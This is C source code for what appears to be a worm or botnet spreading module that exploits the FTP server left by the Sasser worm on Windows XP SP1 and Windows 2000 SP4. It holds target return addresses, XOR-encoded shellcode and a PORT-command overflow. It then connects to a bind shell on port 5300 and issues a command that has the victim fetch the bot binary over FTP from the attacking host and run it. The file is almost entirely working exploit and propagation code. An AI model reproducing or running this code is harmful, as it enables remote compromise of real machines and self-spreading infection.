#include "includes.h"
#include "functions.h"
#include "externs.h"

extern int FTP_TPORT;

struct { char *os; long goreg; long gpa; long lla;}
targetz[] = {
// { "os", go ebx or pop pop ret, GetProcAd ptr, LoadLib ptr },
{ "wXP SP1 all", 0x77C0BF21, 0x77be10CC, 0x77be10D0 },
{ "w2k SP4 all", 0x7801D081, 0x780320cc, 0x780320d0 },
}, tsz;

unsigned char bsh[]={
0xEB,0x0F,0x8B,0x34,0x24,0x33,0xC9,0x80,0xC1,0xDD,0x80,0x36,0xDE,0x46,0xE2,0xFA,
0xC3,0xE8,0xEC,0xFF,0xFF,0xFF,0xBA,0xB9,0x51,0xD8,0xDE,0xDE,0x60,0xDE,0xFE,0x9E,
0xDE,0xB6,0xED,0xEC,0xDE,0xDE,0xB6,0xA9,0xAD,0xEC,0x81,0x8A,0x21,0xCB,0xDA,0xFE,
0x9E,0xDE,0x49,0x47,0x8C,0x8C,0x8C,0x8C,0x9C,0x8C,0x9C,0x8C,0x36,0xD5,0xDE,0xDE,
0xDE,0x89,0x8D,0x9F,0x8D,0xB1,0xBD,0xB5,0xBB,0xAA,0x9F,0xDE,0x89,0x21,0xC8,0x21,
0x0E,0x4D,0xB4,0xDE,0xB6,0xDC,0xDE,0xCA,0x6A,0x55,0x1A,0xB4,0xCE,0x8E,0x8D,0x36,
0xDB,0xDE,0xDE,0xDE,0xBC,0xB7,0xB0,0xBA,0xDE,0x89,0x21,0xC8,0x21,0x0E,0xB4,0xDF,
0x8D,0x36,0xD9,0xDE,0xDE,0xDE,0xB2,0xB7,0xAD,0xAA,0xBB,0xB0,0xDE,0x89,0x21,0xC8,
0x21,0x0E,0xB4,0xDE,0x8A,0x8D,0x36,0xD9,0xDE,0xDE,0xDE,0xBF,0xBD,0xBD,0xBB,0xAE,
0xAA,0xDE,0x89,0x21,0xC8,0x21,0x0E,0x55,0x06,0xED,0x1E,0xB4,0xCE,0x87,0x55,0x22,
0x89,0xDD,0x27,0x89,0x2D,0x75,0x55,0xE2,0xFA,0x8E,0x8E,0x8E,0xB4,0xDF,0x8E,0x8E,
0x36,0xDA,0xDE,0xDE,0xDE,0xBD,0xB3,0xBA,0xDE,0x8E,0x36,0xD1,0xDE,0xDE,0xDE,0x9D,
0xAC,0xBB,0xBF,0xAA,0xBB,0x8E,0xAC,0xB1,0xBD,0xBB,0xAD,0xAD,0x9F,0xDE,0x18,0xD9,
0x9A,0x19,0x99,0xF2,0xDF,0xDF,0xDE,0xDE,0x5D,0x19,0xE6,0x4D,0x75,0x75,0x75,0xBA,
0xB9,0x7F,0xEE,0xDE,0x55,0x9E,0xD2,0x55,0x9E,0xC2,0x55,0xDE,0x21,0xAE,0xD6,0x21,
0xC8,0x21,0x0E
};

void setoff(long GPA, long LLA) {
int gpa=GPA^0xdededede, lla=LLA^0xdededede;
memcpy(bsh+0x1d,&gpa,4);
memcpy(bsh+0x2e,&lla,4);
}
BOOL sasser(EXINFO exinfo)
{

}
int Sasser(SOCKET s) {
	ioctlsocket(s,FIONBIO,0);
	char sbuff[4096];
	int retval;
	char cmd[500];
	char host[32];
	struct sockaddr_in sin;
	struct sockaddr sa;
	struct hostent *he;
	char *buff;
	int Port=5300;
	char bindopt=1;
	int pid=0;
	int type=0;
	char *jmp[]={"\xeb\x06","\xe9\x13\xfc\xff\xff"};
	int sas=sizeof(sa);

	ioctlsocket(s,FIONBIO,0);
	buff=(char *)malloc(4096);

	memset(buff,0,sizeof(buff));

	sprintf(buff,"USER x\n");
	send(s,buff,strlen(buff),0);
	recv(s,buff,4095,0);
	sprintf(buff,"PASS x\n");
	send(s,buff,strlen(buff),0);
	recv(s,buff,4095,0);

	memset(buff+0000,0x90,2000);
	strncpy(buff,"PORT ",5);
	strcat(buff,"\x0a");
	memcpy(buff+272,jmp[0],2);
	memcpy(buff+276,&targetz[type].goreg,4);
	memcpy(buff+280,jmp[1],5);

	setoff(targetz[type].gpa, targetz[type].lla);

	memcpy(buff+300,&bsh,strlen(bsh));
	send(s,buff,strlen(buff),0);
	free(buff);
	getpeername(s,&sa,&sas);
	memset(host,0,sizeof(host));
	sprintf(host,"%d.%d.%d.%d",(unsigned char)sa.sa_data[2],(unsigned char)sa.sa_data[3],(unsigned char)sa.sa_data[4],(unsigned char)sa.sa_data[5]);
	closesocket(s);
	he=gethostbyname(host);
	sin.sin_addr = *((struct in_addr *)he->h_addr_list[0]);
	sin.sin_port = htons(Port);
	Sleep(1);
	s=socket(2,1,6);
	if (connect(s,(struct sockaddr *)&sin,16)!=0) { return 0; }
	memset(sbuff,0,sizeof(sbuff));
    char myfname[1024];
	GetModuleFileName(NULL,myfname,sizeof(myfname));
	sprintf(cmd,"echo open %s %d > o&echo user 1 1 >> o &echo get %s >> o &echo quit >> o &ftp.exe -n -s:o &%s&exit\n",getlocalip(),FTP_TPORT,myfname,myfname);
	for (;;) {
			if ((retval = recv(s,sbuff,4096,0)) < 1) {
				send(s,cmd,strlen(cmd),0);
				sleep(1000); closesocket(s);
				return 1;
			} else { return 0; }
	}
//  return 0;
}